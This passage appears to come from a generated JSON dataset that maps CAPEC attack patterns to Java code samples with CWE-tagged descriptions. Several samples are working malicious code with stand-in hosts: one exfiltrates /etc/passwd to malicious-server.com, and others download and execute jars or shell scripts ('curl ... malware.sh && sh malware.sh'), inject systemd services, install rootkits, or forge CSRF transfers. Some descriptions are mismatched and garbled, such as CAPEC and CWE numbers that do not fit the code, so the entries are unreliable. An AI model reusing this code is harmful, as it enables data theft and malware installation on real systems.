        "code_snippet": "import java.io.IOException;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.util.Scanner;\n\npublic class FingerprintingVulnerableApp {\n    public static void main(String[] args) {\n        try (ServerSocket serverSocket = new ServerSocket(8080)) {\n            while (true) {\n                Socket clientSocket = serverSocket.accept();\n                Scanner input = new Scanner(clientSocket.getInputStream());\n                String request = input.nextLine();\n\n                if (request.contains(\"/version\")) {\n                    clientSocket.getOutputStream().write(\"HTTP/1.1 200 OK\\n\\nApp Version: 1.0.0\".getBytes());\n                } else if (request.contains(\"/status\")) {\n                    clientSocket.getOutputStream().write(\"HTTP/1.1 200 OK\\n\\nStatus: Running\".getBytes());\n                } else {\n                    clientSocket.getOutputStream().write(\"HTTP/1.1 404 Not Found\\n\\n\".getBytes());\n                }\n\n                clientSocket.close();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet represents a simple server application that is vulnerable to application fingerprinting. The server listens on port 8080 and responds to specific requests with different messages. If a request contains '/version', it reveals the application version. If a request contains '/status', it reveals the application's running status. Otherwise, it returns a 404 error. This behavior can be exploited by an adversary to determine the type or version of the application installed on the server, embodying the main idea of CAPEC-170 (Application Fingerprinting). The code also demonstrates CWE-204 (Observable Response Discrepancy) by providing different responses based on the request, which can reveal internal state information to an unauthorized actor."
    },
    {
        "capec_id": "542",
        "capec_name": "Targeted Malware",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class TargetedMalware {\n    public static void main(String[] args) {\n        try {\n            // CWE-507: Trojan Horse - disguised as a benign application\n            System.out.println(\"Starting benign application...\");\n            // CWE-506: Embedded Malicious Code - hidden malicious functionality\n            String sensitiveInfo = getSensitiveInfo();\n            sendSensitiveInfo(sensitiveInfo);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static String getSensitiveInfo() throws IOException {\n        // CWE-497: Exposure of Sensitive System Information\n        BufferedReader reader = new BufferedReader(new FileReader(\"/etc/passwd\"));\n        StringBuilder sb = new StringBuilder();\n        String line;\n        while ((line = reader.readLine()) != null) {\n            sb.append(line).append(\"\\n\");\n        }\n        reader.close();\n        return sb.toString();\n    }\n\n    private static void sendSensitiveInfo(String info) throws IOException {\n        // CWE-512: Spyware - sending collected information without user consent\n        URL url = new URL(\"http://malicious-server.com/collect\");\n        HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n        conn.setRequestMethod(\"POST\");\n        conn.setDoOutput(true);\n        OutputStream os = conn.getOutputStream();\n        os.write(info.getBytes());\n        os.flush();\n        os.close();\n        conn.getResponseCode();\n    }\n}",
        "description": "This Java code snippet represents a targeted malware attack that leverages multiple weaknesses. The main class, `TargetedMalware`, appears to be a benign application (CWE-507: Trojan Horse) but contains hidden malicious functionality (CWE-506: Embedded Malicious Code). The `getSensitiveInfo` method reads sensitive system information from a file (CWE-497: Exposure of Sensitive System Information). The `sendSensitiveInfo` method sends this collected information to a remote server without user consent (CWE-512: Spyware). This code embodies the main idea of the CAPEC by demonstrating how targeted malware can exploit known vulnerabilities to achieve negative technical impacts."
    },
    {
        "capec_id": "543",
        "capec_name": "Counterfeit Websites",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class CounterfeitWebsite {\n    public static void main(String[] args) {\n        try {\n            // CWE-601: Open Redirect\n            String redirectUrl = \"http://malicious-site.com\";\n            URL url = new URL(redirectUrl);\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            conn.setRequestMethod(\"GET\");\n\n            // CWE-494: Download of Code Without Integrity Check\n            InputStream in = conn.getInputStream();\n            FileOutputStream out = new FileOutputStream(\"malicious_code.jar\");\n            byte[] buffer = new byte[1024];\n            int bytesRead;\n            while ((bytesRead = in.read(buffer)) != -1) {\n                out.write(buffer, 0, bytesRead);\n            }\n            in.close();\n            out.close();\n\n            // CWE-506: Embedded Malicious Code\n            Runtime.getRuntime().exec(\"java -jar malicious_code.jar\");\n\n            // CWE-352: CSRF\n            URL csrfUrl = new URL(\"http://legitimate-site.com/transfer?amount=1000&to=attacker\");\n            HttpURLConnection csrfConn = (HttpURLConnection) csrfUrl.openConnection();\n            csrfConn.setRequestMethod(\"GET\");\n            csrfConn.getInputStream().close();\n\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a counterfeit website scenario where multiple vulnerabilities are exploited. The code performs the following actions:\n\n1. **CWE-601: Open Redirect** - Redirects the user to a malicious site.\n2. **CWE-494: Download of Code Without Integrity Check** - Downloads a malicious JAR file from the malicious site without verifying its integrity.\n3. **CWE-506: Embedded Malicious Code** - Executes the downloaded malicious code.\n4. **CWE-352: CSRF** - Performs a Cross-Site Request Forgery attack by sending a request to a legitimate site to transfer money to the attacker's account.\n\nThis code embodies the main idea of the CAPEC by creating a counterfeit website that can gather information and upload malware, leveraging multiple related weaknesses to achieve its malicious goals."
    },
    {
        "capec_id": "544",
        "capec_name": "Counterfeit Organizations",
        "code_snippet": "import javax.net.ssl.HttpsURLConnection;\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.net.URL;\nimport java.security.cert.Certificate;\n\npublic class VulnerableCode {\n    public static void main(String[] args) {\n        try {\n            URL url = new URL(\"https://fake-supplier.com/api/data\"); // CWE-941: Incorrectly Specified Destination\n            HttpsURLConnection connection = (HttpsURLConnection) url.openConnection();\n            connection.setSSLSocketFactory((SSLSocketFactory) SSLSocketFactory.getDefault());\n            connection.connect();\n\n            Certificate[] certs = connection.getServerCertificates();\n            // CWE-295: Improper Certificate Validation\n            if (certs.length > 0) {\n                System.out.println(\"Certificate is valid.\");\n            }\n\n            BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));\n            String inputLine;\n            StringBuilder content = new StringBuilder();\n            while ((inputLine = in.readLine()) != null) {\n                content.append(inputLine);\n            }\n            in.close();\n            System.out.println(content.toString());\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where an application connects to a counterfeit organization posing as a legitimate supplier. The URL used (https://fake-supplier.com/api/data) represents a fake supplier, embodying the main idea of the CAPEC 'Counterfeit Organizations'. The code includes CWE-941 by specifying an incorrect destination URL. It also demonstrates CWE-295 by performing improper certificate validation, where it only checks if any certificate is present without verifying its authenticity. This code snippet highlights the risk of integrating counterfeit components into the supply chain due to improper validation and incorrect destination specification."
    },
    {
        "capec_id": "545",
        "capec_name": "Pull Data from System Resources",
        "code_snippet": "import java.io.File;\nimport java.io.FileInputStream;\nimport java.io.IOException;\n\npublic class SensitiveDataExposure {\n    public static void main(String[] args) {\n        File sensitiveFile = new File(\"/path/to/sensitive/data.txt\");\n        try (FileInputStream fis = new FileInputStream(sensitiveFile)) {\n            byte[] data = new byte[(int) sensitiveFile.length()];\n            fis.read(data);\n            // Simulate improper zeroization of sensitive data\n            System.out.println(\"Sensitive Data: \" + new String(data));\n            // Data is not cleared after use\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where sensitive data is read from a file and then printed to the console. The code does not clear the sensitive data after use, which can lead to exposure of sensitive information. This embodies the main idea of CAPEC-118 (Pull Data from System Resources) by showing how an adversary can gather useful information from system resources. The code also touches on related CWEs such as CWE-1239 (Improper Zeroization of Hardware Register) and CWE-1330 (Remanent Data Readable after Memory Erase) by not properly handling the sensitive data after it has been read."
    },
    {
        "capec_id": "546",
        "capec_name": "Incomplete Data Deletion in a Multi-Tenant Environment",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\n\npublic class IncompleteDataDeletion {\n    public static void main(String[] args) {\n        String tenantData = \"Sensitive Information\";\n        File file = new File(\"tenantData.txt\");\n\n        // Simulate writing sensitive data to a file\n        try (FileWriter writer = new FileWriter(file)) {\n            writer.write(tenantData);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n\n        // Simulate incomplete deletion of data\n        if (file.delete()) {\n            System.out.println(\"File deleted, but data might still be recoverable.\");\n        } else {\n            System.out.println(\"Failed to delete the file.\");\n        }\n\n        // Simulate allocation of the same resource to a new tenant\n        File newTenantFile = new File(\"tenantData.txt\");\n        if (newTenantFile.exists()) {\n            System.out.println(\"New tenant can access the file.\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of incomplete data deletion in a multi-tenant environment. The code writes sensitive information to a file and then attempts to delete the file. However, the deletion is incomplete, and the file can still be accessed by a new tenant. This represents the CAPEC scenario where improper scrubbing of sensitive data (CWE-1266) and improper removal of sensitive information (CWE-212) can lead to unauthorized access by new tenants. The code highlights the risk of sensitive information being recoverable even after an attempt to delete it, emphasizing the need for secure data deletion practices in multi-tenant environments."
    },
    {
        "capec_id": "547",
        "capec_name": "Physical Destruction of Device or Component",
        "code_snippet": "public class Device {\n    private boolean isDestroyed = false;\n\n    public void destroy() {\n        // CWE-1082: Class Instance Self Destruction Control Element\n        isDestroyed = true;\n        System.out.println(\"Device is destroyed.\");\n    }\n\n    public void processData() {\n        if (isDestroyed) {\n            // CWE-1301: Insufficient or Incomplete Data Removal within Hardware Component\n            System.out.println(\"Error: Device is destroyed. Data processing halted.\");\n            return;\n        }\n        // Simulate data processing\n        System.out.println(\"Processing data...\");\n    }\n\n    public void injectError() {\n        // CWE-1334: Unauthorized Error Injection Can Degrade Hardware Redundancy\n        System.out.println(\"Error injected. Device redundancy compromised.\");\n    }\n\n    public static void main(String[] args) {\n        Device device = new Device();\n        device.processData();\n        device.injectError();\n        device.destroy();\n        device.processData();\n    }\n}\n",
        "description": "This Java code snippet represents a simplified model of a device that can be physically destroyed, embodying the main idea of the CAPEC 'Physical Destruction of Device or Component'. The 'destroy' method simulates the physical destruction of the device (CWE-1082). The 'processData' method checks if the device is destroyed before processing data, highlighting the issue of incomplete data removal (CWE-1301). The 'injectError' method simulates unauthorized error injection, which can degrade hardware redundancy (CWE-1334). The main method demonstrates the sequence of processing data, injecting an error, destroying the device, and attempting to process data again."
    },
    {
        "capec_id": "548",
        "capec_name": "Contaminate Resource",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class ContaminateResourceExample {\n    public static void main(String[] args) {\n        try {\n            // CWE-319: Cleartext Transmission of Sensitive Information\n            String sensitiveData = \"Sensitive Information\";\n            Socket socket = new Socket(\"example.com\", 80);\n            PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n            out.println(sensitiveData); // Transmitting sensitive data in cleartext\n\n            // CWE-212: Improper Removal of Sensitive Information Before Storage or Transfer\n            File file = new File(\"sensitive.txt\");\n            FileWriter writer = new FileWriter(file);\n            writer.write(sensitiveData); // Storing sensitive data without proper removal\n            writer.close();\n\n            // CWE-226: Sensitive Information in Resource Not Removed Before Reuse\n            RandomAccessFile raf = new RandomAccessFile(file, \"rw\");\n            raf.setLength(0); // Not properly zeroizing the file before reuse\n            raf.close();\n\n            // CWE-922: Insecure Storage of Sensitive Information\n            File insecureFile = new File(\"insecure.txt\");\n            FileOutputStream fos = new FileOutputStream(insecureFile);\n            fos.write(sensitiveData.getBytes()); // Storing sensitive data insecurely\n            fos.close();\n\n            // CWE-402: Transmission of Private Resources into a New Sphere ('Resource Leak')\n            FileInputStream fis = new FileInputStream(insecureFile);\n            byte[] buffer = new byte[1024];\n            int bytesRead = fis.read(buffer);\n            while (bytesRead != -1) {\n                // Leaking sensitive data to an untrusted party\n                System.out.write(buffer, 0, bytesRead);\n                bytesRead = fis.read(buffer);\n            }\n            fis.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates several vulnerabilities related to the 'Contaminate Resource' CAPEC. The code transmits sensitive information in cleartext (CWE-319), stores sensitive data without proper removal (CWE-212), fails to zeroize sensitive information before reuse (CWE-226), stores sensitive data insecurely (CWE-922), and leaks sensitive data to an untrusted party (CWE-402). These actions can lead to contamination of organizational information systems, requiring them to be taken offline for investigation and mitigation, thus denying availability."
    },
    {
        "capec_id": "549",
        "capec_name": "Local Execution of Code",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableCode {\n    public static void main(String[] args) {\n        try {\n            // CWE-494: Download of Code Without Integrity Check\n            URL url = new URL(\"http://example.com/malicious.jar\");\n            InputStream in = url.openStream();\n            FileOutputStream fos = new FileOutputStream(\"malicious.jar\");\n            byte[] buffer = new byte[4096];\n            int bytesRead;\n            while ((bytesRead = in.read(buffer)) != -1) {\n                fos.write(buffer, bytesRead, bytesRead);\n            }\n            fos.close();\n            in.close();\n\n            // CWE-829: Inclusion of Functionality from Untrusted Control Sphere\n            ProcessBuilder pb = new ProcessBuilder(\"java\", \"-jar\", \"malicious.jar\");\n            pb.start();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where malicious code can be executed locally on a target system. The code downloads a JAR file from a remote URL without performing any integrity checks (CWE-494). After downloading, it executes the JAR file using the ProcessBuilder class, which includes functionality from an untrusted control sphere (CWE-829). This embodies the main idea of CAPEC-Local Execution of Code, where an adversary installs and executes malicious code on the target system."
    },
    {
        "capec_id": "550",
        "capec_name": "Install New Service",
        "code_snippet": "import java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\n\npublic class InstallService {\n    public static void main(String[] args) {\n        try {\n            // CWE-284: Improper Access Control\n            String serviceName = \"MyService\";\n            String serviceCommand = \"C:\\\\path\\\\to\\\\service.exe\";\n            String registryPath = \"HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\\" + serviceName;\n            String registryCommand = \"reg add \" + registryPath + \" /v ImagePath /t REG_EXPAND_SZ /d \" + serviceCommand + \" /f\";\n\n            // CWE-1188: Initialization of a Resource with an Insecure Default\n            String defaultConfig = \"defaultConfig.txt\";\n            Files.write(Paths.get(defaultConfig), \"default_password=1234\".getBytes());\n\n            // CWE-1392: Use of Default Credentials\n            String credentials = new String(Files.readAllBytes(Paths.get(defaultConfig)));\n            System.out.println(\"Using default credentials: \" + credentials);\n\n            // Execute the command to add the service to the registry\n            Runtime.getRuntime().exec(registryCommand);\n            System.out.println(\"Service installed successfully.\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the installation of a new service on a Windows system by modifying the registry, which aligns with the CAPEC description. The code includes several security weaknesses: \n1. CWE-284 (Improper Access Control): The service is added to the registry without proper access control checks.\n2. CWE-1188 (Initialization of a Resource with an Insecure Default): A configuration file is created with insecure default settings.\n3. CWE-1392 (Use of Default Credentials): The service uses default credentials stored in the configuration file.\nThe code represents the main idea of the CAPEC by showing how an adversary might install a new service that runs with elevated privileges at startup, potentially using insecure defaults and improper access controls."
    },
    {
        "capec_id": "551",
        "capec_name": "Modify Existing Service",
        "code_snippet": "import java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\nimport java.nio.file.StandardOpenOption;\n\npublic class ModifyService {\n    public static void main(String[] args) {\n        String serviceConfigPath = \"/etc/systemd/system/my-service.service\";\n        String maliciousConfig = \"[Service]\\nExecStart=/bin/evil_script.sh\\n\";\n\n        try {\n            // CWE-284: Improper Access Control\n            Files.write(Paths.get(serviceConfigPath), maliciousConfig.getBytes(), StandardOpenOption.APPEND);\n            System.out.println(\"Service configuration modified.\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates the concept of 'Modify Existing Service' by altering the configuration of a system service. The code appends a malicious configuration to an existing service file, which could enable a disabled service or modify its behavior. This embodies CWE-284 (Improper Access Control) as it assumes the program has the necessary permissions to modify the service configuration file. The code does not handle credentials securely (CWE-522) and does not ensure the integrity of the service configuration (CWE-15). The snippet is a simplified example to illustrate how modifying existing services can introduce vulnerabilities."
    },
    {
        "capec_id": "552",
        "capec_name": "Install Rootkit ",
        "code_snippet": "import java.io.*;\nimport java.nio.file.*;\n\npublic class RootkitInstaller {\n    public static void main(String[] args) {\n        if (args.length != 2) {\n            System.out.println(\"Usage: java RootkitInstaller <targetFile> <maliciousCode>\");\n            return;\n        }\n\n        String targetFile = args[0];\n        String maliciousCode = args[1];\n\n        try {\n            // CWE-284: Improper Access Control\n            Files.setPosixFilePermissions(Paths.get(targetFile), PosixFilePermissions.fromString(\"rwxrwxrwx\"));\n\n            // CWE-78: OS Command Injection\n            String command = \"echo \" + maliciousCode + \" >> \" + targetFile;\n            Runtime.getRuntime().exec(command);\n\n            // CWE-506: Embedded Malicious Code\n            // CWE-507: Trojan Horse\n            // CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n            System.out.println(\"Malicious code injected into \" + targetFile);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified version of a rootkit installer. The program takes two arguments: a target file and a string representing malicious code. It first sets the file permissions of the target file to be fully accessible (CWE-284: Improper Access Control). Then, it constructs and executes an OS command to append the malicious code to the target file (CWE-78: OS Command Injection). The code also implicitly represents the embedding of malicious code (CWE-506) and the concept of a Trojan Horse (CWE-507) by injecting harmful functionality into an otherwise benign file. Additionally, it exposes sensitive system information by modifying file permissions and executing commands without proper authorization (CWE-497). This snippet embodies the main idea of the CAPEC by demonstrating how an attacker could exploit authentication weaknesses to install a rootkit that alters system behavior."
    },
    {
        "capec_id": "554",
        "capec_name": "Functionality Bypass",
        "code_snippet": "import java.util.Scanner;\n\npublic class AuthenticationBypass {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.print(\"Enter username: \");\n        String username = scanner.nextLine();\n        System.out.print(\"Enter password: \");\n        String password = scanner.nextLine();\n\n        // Client-side enforcement of server-side security\n        if (username.equals(\"admin\") && password.equals(\"password123\")) {\n            System.out.println(\"Access granted.\");\n        } else {\n            System.out.println(\"Access denied.\");\n        }\n\n        // Bypass protection mechanism\n        System.out.print(\"Enter admin command: \");\n        String command = scanner.nextLine();\n        if (command.equals(\"bypass\")) {\n            System.out.println(\"Admin command executed.\");\n        } else {\n            System.out.println(\"Invalid command.\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a functionality bypass vulnerability. The code initially checks for user authentication using a simple username and password check, which is a form of client-side enforcement of server-side security (CWE-602). After the authentication check, it allows the user to enter an admin command. If the user inputs the command 'bypass', the system executes an admin command without proper authorization checks, representing a protection mechanism failure (CWE-693). This bypasses the intended security functionality, embodying the main idea of the CAPEC 'Functionality Bypass'."
    },
    {
        "capec_id": "555",
        "capec_name": "Remote Services with Stolen Credentials",
        "code_snippet": "import java.io.*;\nimport java.net.*;\nimport java.util.Base64;\n\npublic class VulnerableRemoteService {\n    public static void main(String[] args) {\n        try {\n            Socket socket = new Socket(\"example.com\", 22); // CWE-308: Single-factor authentication\n            PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n            BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n\n            String username = \"admin\";\n            String password = \"password123\"; // CWE-521: Weak password requirements\n            String credentials = username + \":\" + password;\n            String encodedCredentials = Base64.getEncoder().encodeToString(credentials.getBytes()); // CWE-522: Insufficiently protected credentials\n\n            out.println(\"AUTH \" + encodedCredentials);\n            String response = in.readLine();\n\n            if (\"OK\".equals(response)) {\n                System.out.println(\"Authenticated successfully\");\n                // Perform malicious activities\n            } else {\n                System.out.println(\"Authentication failed\");\n            }\n\n            socket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable remote service authentication mechanism. The code connects to a remote service using a socket (potentially SSH on port 22) and attempts to authenticate using single-factor authentication (CWE-308) with weak credentials (CWE-521). The credentials are encoded using Base64 (CWE-522), which is an insufficient protection method. If the authentication is successful, it prints a success message, representing the potential for malicious activities once access is gained. This snippet embodies the main idea of the CAPEC 'Remote Services with Stolen Credentials' by showing how an attacker could use weak and improperly protected credentials to gain unauthorized access to a remote service."
    },
    {
        "capec_id": "556",
        "capec_name": "Replace File Extension Handlers",
        "code_snippet": "import java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.nio.file.Paths;\nimport java.nio.file.attribute.FileAttribute;\n\npublic class FileHandlerModifier {\n    public static void main(String[] args) {\n        if (args.length != 2) {\n            System.out.println(\"Usage: java FileHandlerModifier <file-extension> <handler-path>\");\n            return;\n        }\n\n        String fileExtension = args[0];\n        String handlerPath = args[1];\n\n        try {\n            // Simulate modifying the file handler for a given extension\n            Path handlerFile = Paths.get(\"C:\\\\file_handlers\\\\\" + fileExtension + \".handler\");\n            Files.write(handlerFile, handlerPath.getBytes(), new FileAttribute<?>[0]);\n            System.out.println(\"File handler for \" + fileExtension + \" set to \" + handlerPath);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a potential vulnerability where an application modifies the file handler for a given file extension. The program takes two command-line arguments: a file extension and a handler path. It then writes the handler path to a file that represents the file handler for the given extension. This can be exploited by an attacker to set an arbitrary program as the handler for a specific file extension, leading to potential security risks. The code embodies the main idea of CAPEC-Replace File Extension Handlers and is related to CWEs such as CWE-284 (Improper Access Control), CWE-646 (Reliance on File Name or Extension of Externally-Supplied File), and CWE-73 (External Control of File Name or Path)."
    },
    {
        "capec_id": "557",
        "capec_name": "DEPRECATED: Schedule Software To Run",
        "code_snippet": "import java.util.Timer;\nimport java.util.TimerTask;\n\npublic class DeprecatedScheduler {\n    public static void main(String[] args) {\n        Timer timer = new Timer();\n        TimerTask task = new TimerTask() {\n            @Override\n            public void run() {\n                System.out.println(\"Task executed\");\n            }\n        };\n        // Schedule the task to run every second\n        timer.scheduleAtFixedRate(task, 0, 1000);\n    }\n}",
        "description": "This Java code snippet demonstrates the use of the `Timer` and `TimerTask` classes to schedule a task to run at a fixed rate. The `Timer` class is considered obsolete and has been largely replaced by the `ScheduledExecutorService` in modern Java applications. This code embodies the main idea of the deprecated CAPEC 'Schedule Software To Run' by showing how to schedule a task using an outdated method. Additionally, it touches on CWE-477 'Use of Obsolete Function' by using the deprecated `Timer` class, which suggests that the code has not been actively reviewed or maintained. The scheduled task simply prints 'Task executed' to the console every second."
    },
    {
        "capec_id": "558",
        "capec_name": "Replace Trusted Executable",
        "code_snippet": "import java.nio.file.*;\nimport java.io.IOException;\n\npublic class ReplaceTrustedExecutable {\n    public static void main(String[] args) {\n        String trustedExecutablePath = \"/usr/bin/trustedExecutable\";\n        String maliciousExecutablePath = \"/tmp/maliciousExecutable\";\n\n        try {\n            // CWE-284: Improper Access Control - No proper access control checks\n            Files.copy(Paths.get(maliciousExecutablePath), Paths.get(trustedExecutablePath), StandardCopyOption.REPLACE_EXISTING);\n            System.out.println(\"Trusted executable replaced successfully.\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where an attacker replaces a trusted executable with a malicious one. The code lacks proper access control checks (CWE-284), allowing the replacement of the trusted executable located at '/usr/bin/trustedExecutable' with a malicious executable from '/tmp/maliciousExecutable'. This embodies the main idea of the CAPEC 'Replace Trusted Executable', where an adversary exploits weaknesses in privilege management or access control to replace a trusted executable with a malicious version. The code also indirectly touches on CWE-114 (Process Control) by allowing the execution of potentially malicious code."
    },
    {
        "capec_id": "559",
        "capec_name": "Orbital Jamming",
        "code_snippet": "import java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\n\npublic class OrbitalJammingAttack {\n    public static void main(String[] args) {\n        try {\n            // Target satellite IP and port\n            String targetIP = \"192.168.1.100\";\n            int targetPort = 9876;\n\n            // Create a rogue uplink station (DatagramSocket)\n            DatagramSocket socket = new DatagramSocket();\n            InetAddress targetAddress = InetAddress.getByName(targetIP);\n\n            // Disruptive signal payload\n            byte[] disruptiveSignal = new byte[1024];\n            for (int i = 0; i < disruptiveSignal.length; i++) {\n                disruptiveSignal[i] = (byte) 0xFF; // Fill with disruptive data\n            }\n\n            // Send disruptive signals to the target satellite\n            DatagramPacket packet = new DatagramPacket(disruptiveSignal, disruptiveSignal.length, targetAddress, targetPort);\n            socket.send(packet);\n\n            System.out.println(\"Disruptive signal sent to satellite.\");\n\n            socket.close();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified version of an orbital jamming attack. The code creates a rogue uplink station using a DatagramSocket to send disruptive signals to a target satellite. The target satellite's IP address and port are specified, and a payload of disruptive data is sent to the satellite. This disrupts the intended transmission, preventing those within the satellite's footprint from reaching the satellite's targeted or neighboring channels. The code embodies the main idea of the CAPEC by simulating the sending of disruptive signals to a satellite. The related CWEs provide context for potential vulnerabilities, such as improper verification of the source of a communication channel (CWE-940) and improper restriction of communication channels to intended endpoints (CWE-923), which are relevant in the context of this attack."
    },
    {
        "capec_id": "560",
        "capec_name": "Use of Known Domain Credentials",
        "code_snippet": "import java.util.HashMap;\nimport java.util.Map;\n\npublic class VulnerableAuthSystem {\n    private static Map<String, String> userDatabase = new HashMap<>();\n\n    static {\n        // Storing credentials in plain text (CWE-522)\n        userDatabase.put(\"user1\", \"password123\");\n        userDatabase.put(\"user2\", \"password456\");\n    }\n\n    public static boolean authenticate(String username, String password) {\n        // Single-factor authentication (CWE-308)\n        String storedPassword = userDatabase.get(username);\n        return storedPassword != null && storedPassword.equals(password);\n    }\n\n    public static void main(String[] args) {\n        // Simulating an authentication attempt\n        if (authenticate(\"user1\", \"password123\")) {\n            System.out.println(\"Authentication successful!\");\n        } else {\n            System.out.println(\"Authentication failed!\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable authentication system that embodies the main idea of CAPEC-Use of Known Domain Credentials. The code stores user credentials in plain text (CWE-522), uses single-factor authentication (CWE-308), and relies solely on password-based authentication (CWE-309). The `authenticate` method checks the provided username and password against the stored credentials without any additional security measures, making it susceptible to credential theft and unauthorized access. This example highlights the risks associated with insufficiently protected credentials and the use of single-factor authentication."
    },
    {
        "capec_id": "561",
        "capec_name": "Windows Admin Shares with Stolen Credentials",
        "code_snippet": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.UnknownHostException;\nimport java.util.Scanner;\n\npublic class AdminShareAccess {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.print(\"Enter admin username: \");\n        String username = scanner.nextLine();\n        System.out.print(\"Enter admin password: \");\n        String password = scanner.nextLine();\n        System.out.print(\"Enter target machine IP: \");\n        String targetIP = scanner.nextLine();\n\n        try {\n            if (authenticate(username, password)) {\n                accessAdminShare(targetIP);\n            } else {\n                System.out.println(\"Authentication failed.\");\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static boolean authenticate(String username, String password) {\n        // Simulate single-factor authentication\n        return \"admin\".equals(username) && \"password123\".equals(password);\n    }\n\n    private static void accessAdminShare(String targetIP) throws IOException {\n        InetAddress inet = InetAddress.getByName(targetIP);\n        if (inet.isReachable(5000)) {\n            System.out.println(\"Accessing admin share on \" + targetIP);\n            // Simulate access to admin share\n        } else {\n            System.out.println(\"Target machine is not reachable.\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified scenario where an attacker uses stolen or guessed administrator credentials to access Windows Admin Shares on a target machine. The code prompts the user to enter an admin username, password, and target machine IP address. It then performs a basic single-factor authentication check and attempts to access the admin share if authentication is successful. This example embodies the CAPEC 'Windows Admin Shares with Stolen Credentials' and highlights several related CWEs, including CWE-522 (Insufficiently Protected Credentials), CWE-308 (Use of Single-factor Authentication), and CWE-521 (Weak Password Requirements). The code uses hardcoded weak credentials and lacks proper security measures, making it vulnerable to unauthorized access."
    },
    {
        "capec_id": "562",
        "capec_name": "Modify Shared File",
        "code_snippet": "import java.io.*;\nimport java.nio.file.*;\n\npublic class SharedFileModifier {\n    public static void main(String[] args) {\n        String sharedFilePath = \"/shared/directory/sharedFile.txt\";\n        String maliciousContent = \"<script>alert('Hacked!');</script>\";\n\n        try {\n            // CWE-284: Improper Access Control\n            if (Files.isWritable(Paths.get(sharedFilePath))) {\n                // CWE-378: Creation of Temporary File With Insecure Permissions\n                File tempFile = File.createTempFile(\"tempFile\", \".txt\");\n                try (BufferedWriter writer = new BufferedWriter(new FileWriter(tempFile))) {\n                    writer.write(maliciousContent);\n                }\n\n                // CWE-434: Unrestricted Upload of File with Dangerous Type\n                Files.copy(tempFile.toPath(), Paths.get(sharedFilePath), StandardCopyOption.REPLACE_EXISTING);\n\n                // CWE-494: Download of Code Without Integrity Check\n                // Simulating download and execution of code without integrity check\n                Runtime.getRuntime().exec(\"curl -O http://malicious.com/malware.sh && sh malware.sh\");\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where an adversary modifies a shared file by injecting malicious content. The code checks if the shared file is writable (CWE-284: Improper Access Control), creates a temporary file with insecure permissions (CWE-378: Creation of Temporary File With Insecure Permissions), writes malicious content to it, and then replaces the original shared file with the malicious one (CWE-434: Unrestricted Upload of File with Dangerous Type). Additionally, it simulates downloading and executing code without verifying its integrity (CWE-494: Download of Code Without Integrity Check). This represents the CAPEC 'Modify Shared File' by showing how an attacker can manipulate shared files to execute malicious content when accessed by users."
    },
    {
        "capec_id": "563",
        "capec_name": "Add Malicious File to Shared Webroot",
